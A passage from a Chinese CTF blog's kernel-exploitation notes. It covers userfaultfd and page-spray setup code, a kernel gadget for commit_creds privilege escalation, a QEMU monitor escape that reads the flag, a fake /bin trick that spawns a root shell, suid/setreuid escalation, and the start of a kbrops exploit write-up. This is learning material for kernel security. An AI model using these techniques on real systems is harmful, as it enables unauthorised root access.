class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features    = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)fault_page; <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) <span class="comment">//注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//开一个线程，接收错误的信号，然后处理</span></span><br><span class="line">    <span class="type">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="type">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    RegisterUserfault(stuck_mapped_memory, userfaultfd_stuck_handler);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="pgv页级分配"><a href="#pgv页级分配" class="headerlink" title="pgv页级分配"></a>pgv页级分配</h2><h2 id="setsockopt"><a href="#setsockopt" class="headerlink" title="setsockopt"></a>setsockopt</h2><p>当创建一个协议为<code>PF_PACKET</code>的socket时,如下</p><p><code>socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</code></p><p>如果再先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为 <code>TPACKET_V1</code>或者<code>TPACKET_V2</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span> &#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>即</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> version = TPACKET_V1;</span><br><span class="line">setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, &amp;version, <span class="keyword">sizeof</span>(version));</span><br></pre></td></tr></table></figure><p>那么之后当我们创建如下这样一个结构体时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_nr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再调用<code>PACKET_TX_RING</code>或者<code>PACKET_RX_RING</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line"></span><br><span class="line">req.tp_block_size = size;</span><br><span class="line">req.tp_block_nr = nr;</span><br><span class="line">req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br></pre></td></tr></table></figure><p>之后便会分配<code>tp_frame_nr</code>个页框,并且是直接从伙伴系统中提取</p><p>并且当关闭socket时,会将这些页框释放</p><p>最后需要注意的是</p><blockquote><p>需要注意的是低权限用户无法创建一个类型为 <code>SOCK_RAW</code> 协议为 <code>PF_PACKET</code> 的 socket，但是我们可以通过开辟新的命名空间来绕过该限制，不过这样也有一定的缺陷：我们的进程也被隔离到该进程里了，无法获得“真正的 root 权限”</p><p>因此我们最好的做法便是开辟一个子进程，在该子进程中开辟新命名空间专门进行堆喷，父进程/其他子进程用于提权，通过管道与该子进程进行交互</p></blockquote><h2 id="modprobe-path"><a href="#modprobe-path" class="headerlink" title="modprobe_path"></a>modprobe_path</h2><h1 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h1><h2 id="work-for-cpu-fn"><a href="#work-for-cpu-fn" class="headerlink" title="work_for_cpu_fn"></a>work_for_cpu_fn</h2><p>一个十分神奇的gadget</p><p>源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line"><span class="type">long</span> (*fn)(<span class="type">void</span> *);</span><br><span class="line"><span class="type">void</span> *arg;</span><br><span class="line"><span class="type">long</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">work_for_cpu_fn</span><span class="params">(<span class="keyword">struct</span> work_struct *work)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> *<span class="title">wfc</span> =</span> container_of(work, <span class="keyword">struct</span> work_for_cpu, work);</span><br><span class="line"></span><br><span class="line">wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到其会有如下调用</p><p><code>*(arg+0x30)=*(arg+0x20)(*(arg+0x28))</code></p><p>也就是说这个函数不经能够劫持实现任意函数调用,同时还能存储返回值(nb嘞)</p><blockquote><p>该函数位于 workqueue 机制的实现中，只要是开启了多核支持的内核 （CONFIG_SMP）都会包含这个函数的代码。不难注意到，这个函数非常好用，只要能控制第一个参数指向的内存，即可实现带一个任意参数调用任意函数，并把返回值存回第一个参数指向的内存的功能，且该 “gadget” 能干净的返回，执行的过程中完全不用管 SMAP、SMEP 的事情。由于内核中大量的 read / write / ioctl 之类的实现的第一个参数也都恰好是对应的对象本身，可谓是非常的适合这种场景了。考虑到我们提权需要做的事情只是 commit_creds(prepare_kernel_cred(0))，完全可以用两次上述的函数调用原语实现。（如果还需要禁用 SELinux 之类的，再找一个任意地址写 0 的 gadget 即可，很容易找）</p></blockquote><h1 id="奇技淫巧"><a href="#奇技淫巧" class="headerlink" title="奇技淫巧"></a>奇技淫巧</h1><h2 id="QEMU逃逸"><a href="#QEMU逃逸" class="headerlink" title="QEMU逃逸"></a>QEMU逃逸</h2><p>当qemu启动脚本中没有重定向monitor时，可以直接ctrl+A C逃逸，解压rootfs.img读flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">migrate <span class="string">&quot;exec:cp rootfs.img /tmp &quot;</span></span><br><span class="line">migrate <span class="string">&quot;exec:cd /tmp;zcat rootfs.img | cpio -idmv 1&gt;&amp;2&quot;</span></span><br><span class="line">migrate <span class="string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span></span><br><span class="line">(qemu) migrate <span class="string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span></span><br><span class="line">flag&#123;test_flag&#125;qemu-system-x86_64: failed to save SaveStateEntry with <span class="built_in">id</span>(name):)</span><br><span class="line">qemu-system-x86_64: Unable to write to <span class="built_in">command</span>: Broken pipe</span><br><span class="line">qemu-system-x86_64: Unable to write to <span class="built_in">command</span>: Broken pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zcat rootfs.cpio | cpio -idmv 1&gt;&amp;2</span><br></pre></td></tr></table></figure><h2 id="bin目录不为ROOT"><a href="#bin目录不为ROOT" class="headerlink" title="bin目录不为ROOT"></a>bin目录不为ROOT</h2><p>这样可以修改bin里面的命令，而init脚本在退出时，通常包含poweroff命令，或者umount命令，而init运行时是以root权限运行的，所以我们可以修改这些命令从而在输入exit命令调用init中在setsid剩下的命令时来直接cat flag或者获得shell</p><h2 id="根目录不为ROOT"><a href="#根目录不为ROOT" class="headerlink" title="根目录不为ROOT"></a>根目录不为ROOT</h2><p>那么在根目录下，虽然bin的所有者为root，但是可以对bin进行改名，然后我们伪造一个bin目录，里面放上我们伪造的命令，那么就可以以root权限调用这个伪造的命令了，如下为所示例子。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> bin evil_bin</span><br><span class="line">/evil_bin/mkdir bin</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#!/evil_bin/sh&quot;</span> &gt; /bin/power</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/evil_bin/sh&quot;</span> &gt;&gt; /bin/power</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h2 id="密码设置"><a href="#密码设置" class="headerlink" title="密码设置"></a>密码设置</h2><p>如果root账号的密码没有设置的话，直接su即可登录到root，非预期的。</p><p>又或者是默认的密码<code>#</code>,当然其实很多内核并没有提供su</p><p>例如linectf2022-encrypt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">First, connect via netcat.</span><br><span class="line">We got a shell, let&#x27;s look around:</span><br><span class="line">/ $ ls</span><br><span class="line">=&gt; We see the flag file.</span><br><span class="line">/ $ cat flag</span><br><span class="line">=&gt; Not enough permissions.</span><br><span class="line">Are there many other users?</span><br><span class="line">/ $ cat /etc/passwd</span><br><span class="line">=&gt; Only root seems to be available. Let&#x27;s try switching to it:</span><br><span class="line">/ $ su</span><br><span class="line">/ #</span><br><span class="line">=&gt; See the #? This worked! We got root!</span><br><span class="line">/ # cat flag</span><br></pre></td></tr></table></figure><h2 id="suid"><a href="#suid" class="headerlink" title="suid"></a>suid</h2><p>带有suid的可执行文件允许我们拥有文件所有者的权限</p><p>还是lincectf2022的encrypt</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><p>打印的字符串告诉我们busybox具有这个权限位</p><p>Run busybox and it will show us all the configurations which are avialable</p><p>发现其中具有su于是</p><p><code>busybox su root</code></p><h1 id="linux支持"><a href="#linux支持" class="headerlink" title="linux支持"></a>linux支持</h1><h2 id="direct-map-addr-to-from-page-addr"><a href="#direct-map-addr-to-from-page-addr" class="headerlink" title="direct_map_addr_to/from_page_addr"></a>direct_map_addr_to/from_page_addr</h2><p>直接映射区的虚拟地址可以通过线性对应关系与vmemmap段的page结构相互转化</p><p>而每一个page结构体又对应着唯一一个PGN</p><p>又因为直接映射区上的地址减去<code>page_offset_base</code>就是物理内存地址,所以这些之间存在直观的直接线性关系</p><p>关系如下</p><p><strong>direct_map_addr_to_page_addr</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">direct_map_addr_to_page_addr</span><span class="params">(<span class="type">size_t</span> direct_map_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>page_addr_to_direct_map_addr</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">page_addr_to_direct_map_addr</span><span class="params">(<span class="type">size_t</span> vmem_map_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((vmem_map_addr &amp; (~<span class="number">0x40</span>)) - vmemmap_base) / <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> direct_map_addr + page_count * <span class="number">0x1000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="setreuid-setregid"><a href="#setreuid-setregid" class="headerlink" title="setreuid/setregid"></a>setreuid/setregid</h2><p>内核判断用户的依据是当前进程<code>cred</code>结构体中<code>uid</code>与<code>euid</code>两个字段</p><p>特别的当我们需要提权为<code>root</code>时</p><p>必须要<code>uid</code>与<code>euid</code>两个字段<strong>都为0</strong>,linux才会认为我们是<code>root</code>用户(在做过一些尝试后,可以确认至少较高版本是这样的,至于低版本尚未确认)</p><p>如果仅有其中一个字段为<code>0</code>,内核并不会将我们视作特权用户</p><p>提权时当然最好能够同时将这<code>uid</code>与<code>euid</code>都修改为<code>0</code>,但若是条件不允许,仅仅能修改其中的一个,我们就可以利用<code>setreuid(0,0)</code>来进一步的提权</p><p>当执行<code>setreuid(0,0)</code>时,只要<code>uid</code>与<code>euid</code>中任意一个为<code>0</code>,便能够将另一个也修改为<code>0</code>,进而成为被操作系统认可的<code>root</code>用户</p><p>此外:<code>suid</code>并不具备这样的能力</p><p>看内核源码:(<code>/kernel/sys.c</code>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Unprivileged users may change the real uid to the effective uid</span></span><br><span class="line"><span class="comment"> * or vice versa.  (BSD-style)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If you set the real uid at all, or set the effective uid to a value not</span></span><br><span class="line"><span class="comment"> * equal to the real uid, then the saved uid is set to the new effective uid.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This makes it possible for a setuid program to completely drop its</span></span><br><span class="line"><span class="comment"> * privileges, which is often a useful assertion to make when you are doing</span></span><br><span class="line"><span class="comment"> * a security audit over a program.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The general idea is that a program which uses just setreuid() will be</span></span><br><span class="line"><span class="comment"> * 100% compatible with BSD.  A program which uses just setuid() will be</span></span><br><span class="line"><span class="comment"> * 100% compatible with POSIX with saved IDs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">long</span> __sys_setreuid(<span class="type">uid_t</span> ruid, <span class="type">uid_t</span> euid)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">ns</span> =</span> current_user_ns();</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"><span class="type">kuid_t</span> kruid, keuid;</span><br><span class="line"></span><br><span class="line">kruid = make_kuid(ns, ruid);</span><br><span class="line">keuid = make_kuid(ns, euid);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((ruid != (<span class="type">uid_t</span>) <span class="number">-1</span>) &amp;&amp; !uid_valid(kruid))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> ((euid != (<span class="type">uid_t</span>) <span class="number">-1</span>) &amp;&amp; !uid_valid(keuid))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">new = prepare_creds();</span><br><span class="line"><span class="keyword">if</span> (!new)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">old = current_cred();</span><br><span class="line"></span><br><span class="line">retval = -EPERM;</span><br><span class="line"><span class="keyword">if</span> (ruid != (<span class="type">uid_t</span>) <span class="number">-1</span>) &#123;</span><br><span class="line">new-&gt;uid = kruid;</span><br><span class="line"><span class="keyword">if</span> (!uid_eq(old-&gt;uid, kruid) &amp;&amp;</span><br><span class="line">    !uid_eq(old-&gt;euid, kruid) &amp;&amp;</span><br><span class="line">    !ns_capable_setid(old-&gt;user_ns, CAP_SETUID))</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (euid != (<span class="type">uid_t</span>) <span class="number">-1</span>) &#123;</span><br><span class="line">new-&gt;euid = keuid;</span><br><span class="line"><span class="keyword">if</span> (!uid_eq(old-&gt;uid, keuid) &amp;&amp;</span><br><span class="line">    !uid_eq(old-&gt;euid, keuid) &amp;&amp;</span><br><span class="line">    !uid_eq(old-&gt;suid, keuid) &amp;&amp;</span><br><span class="line">    !ns_capable_setid(old-&gt;user_ns, CAP_SETUID))</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!uid_eq(new-&gt;uid, old-&gt;uid)) &#123;</span><br><span class="line">retval = set_user(new);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ruid != (<span class="type">uid_t</span>) <span class="number">-1</span> ||</span><br><span class="line">    (euid != (<span class="type">uid_t</span>) <span class="number">-1</span> &amp;&amp; !uid_eq(keuid, old-&gt;uid)))</span><br><span class="line">new-&gt;suid = new-&gt;euid;</span><br><span class="line">new-&gt;fsuid = new-&gt;euid;</span><br><span class="line"></span><br><span class="line">retval = security_task_fix_setuid(new, old, LSM_SETID_RE);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">retval = set_cred_ucounts(new);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">flag_nproc_exceeded(new);</span><br><span class="line"><span class="keyword">return</span> commit_creds(new);</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">abort_creds(new);</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE2(setreuid, <span class="type">uid_t</span>, ruid, <span class="type">uid_t</span>, euid)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __sys_setreuid(ruid, euid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到,不考虑特权用户的情况下</p><p>要设置<code>uid</code>,必须要<code>uid,euid</code>中至少一个为目标id</p><p>要设置<code>euid</code>,必须要<code>uid,euid,suid</code>中至少一个为目标id</p><h2 id="secondary-startup-64"><a href="#secondary-startup-64" class="headerlink" title="secondary_startup_64"></a>secondary_startup_64</h2><p>一般情况下</p><p>在直接映射区<code>direct_mapping_area+0x9d000</code>的位置</p><p>会有一个函数指针<code>secondary_startup_64</code></p><p>且其就在<code>kernel text</code>开头的部分,一般等于<code>kernel text+0x70</code></p><h2 id="内存大小对kernelpwn的影响"><a href="#内存大小对kernelpwn的影响" class="headerlink" title="内存大小对kernelpwn的影响"></a>内存大小对kernelpwn的影响</h2><blockquote><p>This file implements KASLR memory randomization for x86_64. It randomizes the virtual address space of kernel memory regions (physical memory mapping, vmalloc &amp; vmemmap) for x86_64. This security feature mitigates exploits relying on predictable kernel addresses.</p></blockquote><p>kaslr主要针对以下三个区域</p><ul><li>direct mapping area</li><li>vmalloc area</li><li>virtual memory map area</li></ul><p>更多相关可以在<code>/arch/x86/mm/kaslr.c</code>中查看</p><p><code>kaslr</code>的随机化粒度是<code>256m</code>,粒度即说明kaslr随机化范围的最小单位</p><p>当分配的内存大小小于<code>256M</code>时,因为加载的内存达不到一个粒度</p><p>我们可以简单的得到:</p><p><code>page_offset_base = heap_leak &amp; 0xffffffffff0000000</code></p><p>但在 MEM &gt; 256M 的机器上,这并不总是准确的,我们只能得到本粒度的基址</p><p>因此要获得确切的基址就需要办法获得一些能够大致确定其范围的能力,不过好在一般内核pwn题内存都不会大于256m,而就算大于256m,也会优先使用较低的</p><p>当 MEM &gt; 16G时,vmemmap_base也不能使用上面的代码实现,不过好在一般也不会有这种情况</p>]]></content>
    
    
    <summary type="html">简单记一些东西</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel练习记录</title>
    <link href="https://ixout.github.io/posts/3059/"/>
    <id>https://ixout.github.io/posts/3059/</id>
    <published>2024-03-19T14:53:49.000Z</published>
    <updated>2024-11-20T14:11:46.228Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题录"><a href="#题录" class="headerlink" title="题录"></a>题录</h1><h2 id="tctf2021-kbrops"><a href="#tctf2021-kbrops" class="headerlink" title="tctf2021-kbrops"></a>tctf2021-kbrops</h2><p>这道题比较特殊在其flag并不是作为文件系统中的一个文件形式存在</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">stty</span> intr ^]</span><br><span class="line"><span class="built_in">cd</span> `<span class="built_in">dirname</span> <span class="variable">$0</span>`</span><br><span class="line"><span class="built_in">timeout</span> --foreground 300 qemu-system-x86_64 \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -cpu host,+smep,+smap \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd initramfs.cpio.gz \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor none \</span><br><span class="line">    -drive file=flag.txt,format=raw \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 kaslr kpti quiet oops=panic panic=1&quot;</span></span><br></pre></td></tr></table></figure><p>而是将 flag 作为一个设备载入，因此我们需要读取 <code>/dev/sda</code> 以获取 flag，这仍然需要 root 权限</p><p>模块十分十分简单仅仅是实现了一个选项为<code>0x666</code>的ioctl</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/t01fa730a1572f2f1d0.png" alt=""></p><p>会取我们传入的前两个字节作为后续拷贝的 size，之后 kmalloc 一个 object，从我们传入的第三个字节开始拷贝，之后再从 object 拷贝到栈上，这里有个十分明显的栈溢出</p><p>既然目前有了栈溢出，而且没有 stack canary 保护，比较朴素的提权方法就是执行 <code>commit_creds(prepare_kernel_cred(NULL))</code> 提权到 root，但是由于开启了 kaslr，因此我们还需要知道 kernel offset，但是毫无疑问的是仅有一个栈溢出是没法让我们直接泄漏出内核中的数据的</p><p>最简单最暴力的方法就是爆破了,可以知道内核kaslr的随机化只有9位</p><p>爆破个几百次总能成功 :(</p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 